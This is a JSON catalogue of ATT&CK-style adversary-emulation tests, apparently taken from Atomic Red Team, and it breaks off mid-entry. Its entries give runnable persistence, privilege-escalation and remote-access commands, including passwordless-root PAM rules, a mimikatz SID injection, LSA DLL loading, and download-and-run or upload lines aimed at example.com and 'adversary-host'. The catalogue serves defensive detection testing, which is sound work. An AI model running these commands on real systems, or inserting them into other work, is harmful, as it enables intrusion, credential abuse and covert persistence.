   "T1037.004": {
      "technique_name": "Boot or Logon Initialization Scripts: Rc.common",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n",
            "command": "sudo echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common"
         },
         {
            "description": "Modify rc.common\n",
            "command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common; sudo chmod +x /etc/rc.common"
         },
         {
            "description": "Modify rc.local\n",
            "command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.local; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.local; sudo chmod +x /etc/rc.local"
         }
      ]
   },
   "T1037.001": {
      "technique_name": "Boot or Logon Initialization Scripts: Logon Script (Windows)",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n",
            "command": "echo \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037.001-log.txt\" > %temp%\\art.bat && REG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"%temp%\\art.bat\" /f"
         }
      ]
   },
   "T1037.005": {
      "technique_name": "Boot or Logon Initialization Scripts: Startup Items",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Modify or create an file in /Library/StartupItems\n\n[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\n",
            "command": "sudo touch /Library/StartupItems/EvilStartup.plist"
         }
      ]
   },
   "T1543.003": {
      "technique_name": "Create or Modify System Process: Windows Service",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n",
            "command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" && sc start Fax"
         },
         {
            "description": "Download an executable from github and start it as a service on a remote endpoint\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
            "command": "sc.exe \\\\localhost create AtomicTestService_CMD binPath= \"411da5_AtomicService.exe\" start=auto type=Own && sc.exe \\\\localhost start AtomicTestService_CMD"
         },
         {
            "description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n",
            "command": "New-Service -Name \"AtomicTestService_PowerShell\" -BinaryPathName \"C:\\Users\\puma-4\\Desktop\\411da5_AtomicService.exe\"; Start-Service -Name \"AtomicTestService_PowerShell\""
         },
         {
            "description": "It's running Dll as service to emulate the TinyTurla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n",
            "command": "copy \"$PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll\" %systemroot%\\system32\\ && sc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto && sc config W64Time DisplayName= \"Windows 64 Time\" && sc description W64Time \"Maintain date and time synch on all clients and services in the network\" && reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f && reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f && sc start W64Time"
         },
         {
            "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
            "command": "sc.exe create AtomicTestService_CMD binPath= \"411da5_AtomicService.exe\" start=auto  type=Own && sc.exe start AtomicTestService_CMD"
         },
         {
            "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n",
            "command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n"
         }
      ]
   },
   "T1134.005": {
      "technique_name": "Access Token Manipulation: SID-History Injection",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller\n",
            "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::add /sid:S-1-5-21-1004336348-1177238915-682003330-1134 /sam:$env:username\" \"exit\""
         }
      ]
   },
   "T1546.002": {
      "technique_name": "Event Triggered Execution: Screensaver",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n",
            "command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg && copy C:\\Windows\\System32\\cmd.exe \"%SystemRoot%\\System32\\evilscreensaver.scr\" && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f && reg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f && if 0 NEQ 0 shutdown /r /t 0"
         }
      ]
   },
   "T1556.003": {
      "technique_name": "Modify Authentication Process: Pluggable Authentication Modules",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
            "command": "sudo sed -i \"1s,^,auth sufficient pam_succeed_if.so uid >= 0\\n,g\" /etc/pam.d/su-l"
         },
         {
            "description": "Creates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a PAM module that allows every user to su to root without a password.\n",
            "command": "if [ -f /tmp/pam_evil.so ]; then : ; else sudo gcc -shared -fPIC -o /tmp/pam_evil.so 8545b9_pam_evil.c; fi; if [ -f /usr/include/security/pam_modules.h ]; then : ; else if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n \"`which yum`\" ]; then sudo yum -y install pam-devel; fi; fi;  ;  sudo sed -i \"1s,^,auth sufficient /tmp/pam_evil.so\\n,g\" /etc/pam.d/su-l"
         }
      ]
   },
   "T1546.014": {
      "technique_name": "Event Triggered Execution: Emond",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n",
            "command": "sudo cp \"d6d565_T1546.014_emond.plist\" /etc/emond.d/rules/T1546.014_emond.plist; sudo touch /private/var/db/emondClients/T1546.014"
         }
      ]
   },
   "T1556.002": {
      "technique_name": "Modify Authentication Process: Password Filter DLL",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n",
            "command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"C:\\Users\\puma-4\\Desktop\\lsa_backup.reg\"; $passwordFilterName = (Copy-Item \"C:\\Users\\puma-4\\Desktop\\AtomicRedTeamPWFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename; $lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"; $notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\"); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues"
         }
      ]
   },
   "T1610": {
      "technique_name": "Deploy a container",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique. \n",
            "command": "docker build -t t1610 $PathtoAtomicsFolder/T1610/src/; docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh"
         }
      ]
   },
   "T1574.009": {
      "technique_name": "Hijack Execution Flow: Path Interception by Unquoted Path",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "When a service is created whose executable path contains spaces and isn\u2019t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n",
            "command": "copy \"0655d1_WindowsServiceExample.exe\" \"C:\\Program Files\\windows_service.exe\" && copy \"0655d1_WindowsServiceExample.exe\" \"C:\\program.exe\" && sc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto && sc start \"Example Service\""
         }
      ]
   },
   "T1133": {
      "technique_name": "External Remote Services",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n",
            "command": "$extList = \"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"; foreach ($extension in $extList) {;   New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force;   New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}; Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name \"chrome\""
         }
      ]
   },
   "T1574.008": {
      "technique_name": "Hijack Execution Flow: Path Interception by Search Order Hijacking",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n",
            "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"C:\\Users\\puma-4\\Desktop\\calc.cs\"; Powershell -noprofile"
         }
      ]
   },
   "T1055.004": {
      "technique_name": "Process Injection: Asynchronous Procedure Call",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n",
            "command": "\"0cb710_T1055.exe\""
         }
      ]
   },
   "T1056.004": {
      "technique_name": "Input Capture: Credential API Hooking",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Hooks functions in PowerShell to read TLS Communications\n",
            "command": "mavinject $pid /INJECTRUNNING \"#{file_name}\"; Invoke-WebRequest"
         }
      ]
   },
   "T1091": {
      "technique_name": "Replication Through Removable Media",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Simulates an adversary copying malware to all connected removable drives. \n",
            "command": "$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID; ForEach ($Drive in $RemovableDrives); {; write-host \"Removable Drive Found:\" $Drive; New-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"; }"
         }
      ]
   },
   "T1547.002": {
      "technique_name": "Authentication Package",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n",
            "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\package.dll\" C:\\Windows\\System32\\; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f"
         }
      ]
   },
   "T1547.008": {
      "technique_name": "Boot or Logon Autostart Execution: LSASS Driver",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n",
            "command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll\""
         }
      ]
   },
   "T1546.013": {
      "technique_name": "Event Triggered Execution: PowerShell Profile",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n",
            "command": "Add-Content $profile -Value \"\"; Add-Content $profile -Value \"Start-Process calc.exe\"; powershell -Command exit"
         }
      ]
   },
   "T1219": {
      "technique_name": "Remote Access Software",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n",
            "command": "Start-Process -Wait -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_UltraViewer.exe\" -Argument \"/silent\" -PassThru; Start-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'"
         },
         {
            "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
            "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"; Start-Process $file1 /S; "
         },
         {
            "description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n",
            "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"; $file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"; Start-Process $file1 /S; "
         },
         {
            "description": "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n",
            "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\RemotePC.exe\""
         },
         {
            "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n",
            "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_NetSupport.exe\" -ArgumentList \"/S /v/qn\""
         },
         {
            "description": "An adversary may attempt to trick the user into downloading MSP360 Connect for use as a C2 channel.\nUpon successful execution, MSP360 Connect will be executed.\n",
            "command": "Start-Process $env:ProgramFiles\\Connect\\Connect.exe"
         },
         {
            "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n",
            "command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"; Invoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi\"; msiexec /i $installer /qn"
         },
         {
            "description": "An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.\nUpon successful execution, UltraVNC will be executed.\n",
            "command": "Start-Process \"$env:ProgramFiles\\RealVNC\\VNC Viewer\\vncviewer.exe\""
         },
         {
            "description": "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n",
            "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe\""
         },
         {
            "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n",
            "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"; Start-Process -Wait $file1 /quiet; Start-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\""
         },
         {
            "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n",
            "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"; Start-Process -Wait $file1 /S; Start-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'"
         }
      ]
   },
   "T1105": {
      "technique_name": "Ingress Tool Transfer",
      "tactic": "command-and-control",
      "known implementations": [
         {
            "description": "Use nimgrab.exe to download a file from the web. \n",
            "command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\\Atomic-license.txt"
         },
         {
            "description": "Utilize scp to perform a remote file copy (push)\n",
            "command": "scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/"
         },
         {
            "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n",
            "command": "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt"
         },
         {
            "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n",
            "command": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll && C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll"
         },
         {
            "description": "Utilize scp to perform a remote file copy (pull)\n",
            "command": "scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/"
         },
         {
            "description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
            "command": "del %TEMP%\\redcanary.cab >nul 2>&1 && C:\\Windows\\System32\\replace.exe \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab %TEMP% /A"
         },
         {
            "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n",
            "command": "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt"
         },
         {
            "description": "Create a ZIP file from a folder in a remote drive\n",
            "command": "del %TEMP%\\PrintBrm.zip >nul 2>&1  && C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\  -f %TEMP%\\PrintBrm.zip -O FORCE"
         },
         {
            "description": "Utilize sftp to perform a remote file copy (push)\n",
            "command": "sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'"
         },
         {
            "description": "Utilize rsync to perform a remote file copy (pull)\n",
            "command": "rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files"
         },
         {
            "description": "Use 'iwr' or \"Invoke-WebRequest\" -URI argument to download a file from the web. Note: without -URI also works in some versions.\n",
            "command": "powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt"
         },
         {
            "description": "Utilize rsync to perform a remote file copy (push)\n",
            "command": "rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files"
         },
         {
            "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n",
            "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe && C:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt"
         },
         {
            "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n",
            "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\Atomic-license.txt"
         },
         {
            "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n",
            "command": "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")"
         },
         {
            "description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n",
            "command": "curl -sO"
         },
         {
            "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n",
            "command": "finger base64_filedata@localhost"
         },
         {
            "description": "Utilize sftp to perform a remote file copy (pull)\n",
            "command": "sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/"
         },
         {
            "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n",
            "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"; New-Item -Path $datePath -ItemType Directory; Set-Location $datePath; certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt; Get-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }"
         },
         {
            "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n",
            "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"; & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml"
         },
         {
            "description": "Use certreq to download a file from the web",
            "command": "certreq.exe -Post -config https://example.com c:\\windows\\win.ini %temp%\\Atomic-license.txt"
         },
         {
            "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n",
            "command": "pushd \\\\localhost\\C$ && echo var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js && CScript.exe AtomicTestT1105.js //E:JScript && del AtomicTestT1105.js /Q >nul 2>&1 && del AtomicTestFileT1105.js /Q >nul 2>&1 && popd"
         },
         {
            "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n",
            "command": "C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com && C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com"
         },
         {
            "description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n",
            "command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\" && MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\\Atomic-license.txt"
         },
         {
            "description": "Copy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
            "command": "del %TEMP%\\redcanary.cab >nul 2>&1 && C:\\Windows\\System32\\replace.exe \"682a17_redcanary.cab\" %TEMP% /A"
         },
         {
            "description": "Use wscript to run a local VisualBasic file to download a remote file",
